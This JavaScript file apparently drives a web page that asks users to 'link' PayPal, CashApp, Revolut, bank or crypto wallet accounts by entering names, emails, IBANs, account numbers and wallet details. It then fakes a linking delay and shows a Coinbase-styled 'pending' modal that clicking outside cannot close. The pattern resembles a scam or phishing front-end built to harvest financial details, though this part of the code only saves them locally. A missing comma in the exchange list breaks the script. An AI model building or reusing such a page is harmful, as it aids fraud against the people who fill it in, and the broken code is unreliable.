// Global state
let currentFormType = ""
let isLoading = false

// Form configurations
const formConfigs = {
  paypal: {
    title: "Link your PayPal",
    icon: "https://otiktpyazqotihijbwhm.supabase.co/storage/v1/object/public/images/e1fb5914-8a23-4266-b736-c1ce75dd1c00-paypal-seeklogo.png",
    fields: [
      {
        name: "paypalTag",
        label: "PayPal Tag",
        type: "text",
        icon: "hash",
        placeholder: "@username",
        required: true,
      },
      {
        name: "email",
        label: "Email",
        type: "email",
        icon: "mail",
        placeholder: "your@email.com",
        required: true,
        validation: "email",
      },
      {
        name: "fullName",
        label: "Full Name",
        type: "text",
        icon: "user",
        placeholder: "John Doe",
        required: true,
      },
    ],
  },
  crypto: {
    title: "Link your Crypto Wallet",
    icon: "https://cryptologos.cc/logos/bitcoin-btc-logo.png",
    fields: [
      {
        name: "fullName",
        label: "Full Name",
        type: "text",
        icon: "user",
        placeholder: "John Doe",
        required: true,
      },
      {
        name: "email",
        label: "Email",
        type: "email",
        icon: "mail",
        placeholder: "your@email.com",
        required: true,
        validation: "email",
      },
      {
        name: "walletExchange",
        label: "Wallet Exchange",
        type: "select",
        icon: "building",
        options: [
          "Binance",
          "Bybit",
          "Coinbase",
          "Crypto.com",
          "Exodus",
          "Bitget",
          "Gate.io"
          "Zengo"
        ],
        required: true,
      },
      {
        name: "walletAddress",
        label: "Wallet Address",
        type: "text",
        icon: "credit-card",
        placeholder: "Enter wallet address",
        required: true,
      },
      {
        name: "network",
        label: "Network",
        type: "text",
        icon: "hash",
        placeholder: "e.g. Ethereum, BSC, Solana",
        required: true,
      },
    ],
  },
  cashapp: {
    title: "Link your CashApp",
    icon: "https://otiktpyazqotihijbwhm.supabase.co/storage/v1/object/public/images/d543a86c-20b7-4771-a355-c48f998ceec4-cash-app-seeklogo.png",
    fields: [
      {
        name: "cashtag",
        label: "CashApp Tag",
        type: "text",
        icon: "hash",
        placeholder: "$username",
        required: true,
      },
      {
        name: "email",
        label: "Email",
        type: "email",
        icon: "mail",
        placeholder: "your@email.com",
        required: true,
        validation: "email",
      },
      {
        name: "fullName",
        label: "Full Name",
        type: "text",
        icon: "user",
        placeholder: "John Doe",
        required: true,
      },
    ],
  },
  revolut: {
    title: "Link your Revolut",
    icon: "https://otiktpyazqotihijbwhm.supabase.co/storage/v1/object/public/images/b7377ae9-f12d-4ceb-8ba1-fce92cc3a23f-download%20(1).png",
    fields: [
      {
        name: "fullName",
        label: "Full Name",
        type: "text",
        icon: "user",
        placeholder: "John Doe",
        required: true,
      },
      {
        name: "email",
        label: "Email",
        type: "email",
        icon: "mail",
        placeholder: "your@email.com",
        required: true,
        validation: "email",
      },
      {
        name: "bankBranch",
        label: "Bank Branch",
        type: "text",
        icon: "building",
        placeholder: "Main Branch",
        required: true,
      },
      {
        name: "iban",
        label: "IBAN Account Number",
        type: "text",
        icon: "credit-card",
        placeholder: "GB29 NWBK 6016 1331 9268 19",
        required: true,
      },
    ],
  },
  bank: {
    title: "Link your Bank Account",
    icon: null,
    fields: [
      {
        name: "fullName",
        label: "Full Name",
        type: "text",
        icon: "user",
        placeholder: "John Doe",
        required: true,
      },
      {
        name: "accountNumber",
        label: "Account Number",
        type: "text",
        icon: "credit-card",
        placeholder: "1234567890",
        required: true,
      },
      {
        name: "bankName",
        label: "Bank Name",
        type: "text",
        icon: "building",
        placeholder: "Chase Bank",
        required: true,
      },
      {
        name: "phone",
        label: "Phone Number",
        type: "tel",
        icon: "phone",
        placeholder: "+1 (555) 123-4567",
        required: true,
      },
    ],
  },
}

// Icon SVGs
const icons = {
  hash: '<path d="M4 9h16M4 15h16M10 3L8 21M16 3l-2 18"/>',
  mail: '<path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/>',
  user: '<path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>',
  building: '<path d="M3 21h18"/><path d="M5 21V7l8-4v18"/><path d="M19 21V11l-6-4"/>',
  "credit-card": '<rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/>',
  phone:
    '<path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>',
}

// Utility functions
function showPage(pageId) {
  // Hide all pages
  document.querySelectorAll(".page").forEach((page) => {
    page.classList.remove("active")
  })

  // Show target page
  document.getElementById(pageId).classList.add("active")
}

function validateEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  return emailRegex.test(email)
}

function createIcon(iconName) {
  return `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">${icons[iconName]}</svg>`
}

// Check if form was already submitted
function isFormSubmitted(platform) {
  return localStorage.getItem(`${platform}FormSubmitted`) === "true"
}

// Mark form as submitted
function markFormSubmitted(platform, formData) {
  localStorage.setItem(`${platform}FormSubmitted`, "true")
  localStorage.setItem(`${platform}FormData`, JSON.stringify(formData))
}

// Main navigation handler
function handleClick(platform) {
  // Check if form was already submitted
  if (isFormSubmitted(platform)) {
    // Skip form and go directly to Coinbase status page
    initializeCoinbasePage()
    showPage("coinbasePage")
    return
  }

  currentFormType = platform
  setupFormPage(platform)
  showPage("formPage")
}

// Coinbase page functionality
function initializeCoinbasePage() {
  const linkStatus = localStorage.getItem("coinbaseLinkStatus")
  const modalDismissed = localStorage.getItem("coinbaseModalDismissed") === "true"

  if (!linkStatus) {
    // First visit - set status to pending and show modal
    localStorage.setItem("coinbaseLinkStatus", "pending")
    showModal()
  } else if (linkStatus === "pending" && !modalDismissed) {
    // Show modal only if status is pending and modal hasn't been dismissed
    showModal()
  }
}

function showModal() {
  document.getElementById("modal").classList.add("active")
}

function closeModal() {
  document.getElementById("modal").classList.remove("active")
  localStorage.setItem("coinbaseModalDismissed", "true")
}

// Form functionality
function setupFormPage(type) {
  const config = formConfigs[type]
  if (!config) return

  // Set form title and icon
  document.getElementById("formTitle").textContent = config.title

  const formIconImg = document.getElementById("formIconImg")
  const formIcon = document.getElementById("formIcon")

  if (config.icon) {
    formIconImg.src = config.icon
    formIconImg.alt = config.title
    formIconImg.style.display = "block"
    // Hide any existing SVG
    const existingSvg = formIcon.querySelector("svg")
    if (existingSvg) existingSvg.style.display = "none"
  } else {
    formIconImg.style.display = "none"
    // Show bank icon for bank type
    let existingSvg = formIcon.querySelector("svg")
    if (!existingSvg) {
      existingSvg = document.createElement("div")
      existingSvg.innerHTML = createIcon("building")
      formIcon.appendChild(existingSvg.firstChild)
    }
    existingSvg.style.display = "block"
  }

  // Generate form fields
  const formFields = document.getElementById("formFields")
  formFields.innerHTML = ""

  // Check if we have saved form data to pre-populate
  const savedData = localStorage.getItem(`${type}FormData`)
  const formData = savedData ? JSON.parse(savedData) : {}

  config.fields.forEach((field) => {
    const fieldDiv = document.createElement("div")
    fieldDiv.className = "form-field"

    if (field.type === "select") {
      fieldDiv.innerHTML = `
        <label class="form-label" for="${field.name}">
          <div class="label-icon">${createIcon(field.icon)}</div>
          ${field.label}
          ${field.required ? '<span class="required">*</span>' : ""}
        </label>
        <div class="input-wrapper">
          <select id="${field.name}" name="${field.name}" class="form-input" ${field.required ? "required" : ""}>
            <option value="">Select Exchange</option>
            ${field.options.map(opt => `<option value="${opt}" ${formData[field.name] === opt ? "selected" : ""}>${opt}</option>`).join("")}
          </select>
        </div>
        <div class="error-message" id="${field.name}-error"></div>
      `
    } else {
      fieldDiv.innerHTML = `
        <label class="form-label" for="${field.name}">
          <div class="label-icon">${createIcon(field.icon)}</div>
          ${field.label}
          ${field.required ? '<span class="required">*</span>' : ""}
        </label>
        <div class="input-wrapper">
          <div class="input-icon">${createIcon(field.icon)}</div>
          <input 
            type="${field.type}" 
            id="${field.name}" 
            name="${field.name}"
            class="form-input" 
            placeholder="${field.placeholder || ""}"
            value="${formData[field.name] || ""}"
            ${field.required ? "required" : ""}
          >
        </div>
        <div class="error-message" id="${field.name}-error"></div>
      `
    }
    formFields.appendChild(fieldDiv)
  })

  // Setup form submission
  const form = document.getElementById("linkingForm")
  form.onsubmit = handleFormSubmit
}

function handleFormSubmit(e) {
  e.preventDefault()

  if (isLoading) return

  const config = formConfigs[currentFormType]
  if (!config) return

  // Validate form
  let isValid = true
  const formData = {}

  config.fields.forEach((field) => {
    const input = document.getElementById(field.name)
    const errorDiv = document.getElementById(`${field.name}-error`)
    const value = input.value.trim()

    // Clear previous errors
    input.classList.remove("error")
    errorDiv.textContent = ""

    // Check required fields
    if (field.required && !value) {
      input.classList.add("error")
      errorDiv.textContent = `${field.label} is required`
      isValid = false
    } else if (field.validation === "email" && value && !validateEmail(value)) {
      input.classList.add("error")
      errorDiv.textContent = "Please enter a valid email address"
      isValid = false
    } else {
      formData[field.name] = value
    }
  })

  if (!isValid) return

  // Submit form
  submitForm(formData)
}

async function submitForm(formData) {
  isLoading = true
  const submitBtn = document.getElementById("submitBtn")
  submitBtn.textContent = "Linking Account..."
  submitBtn.disabled = true

  // Simulate API call
  await new Promise((resolve) => setTimeout(resolve, 1500))

  // Mark form as submitted and save data
  markFormSubmitted(currentFormType, formData)

  // Set Coinbase status to pending (this will trigger the modal)
  localStorage.setItem("coinbaseLinkStatus", "pending")
  // Reset modal dismissed flag so it shows again
  localStorage.removeItem("coinbaseModalDismissed")

  isLoading = false
  submitBtn.textContent = "Link Account"
  submitBtn.disabled = false

  // Navigate to Coinbase status page and show modal
  showPage("coinbasePage")
  // Small delay to ensure page transition, then show modal
  setTimeout(() => {
    showModal()
  }, 100)
}

// Initialize app
document.addEventListener("DOMContentLoaded", () => {
  // Show home page by default
  showPage("homePage")

  // Prevent modal from closing when clicking outside
  document.getElementById("modal").addEventListener("click", function (e) {
    if (e.target === this) {
      e.preventDefault()
    }
  })
})

// Handle browser back button
window.addEventListener("popstate", () => {
  showPage("homePage")
})
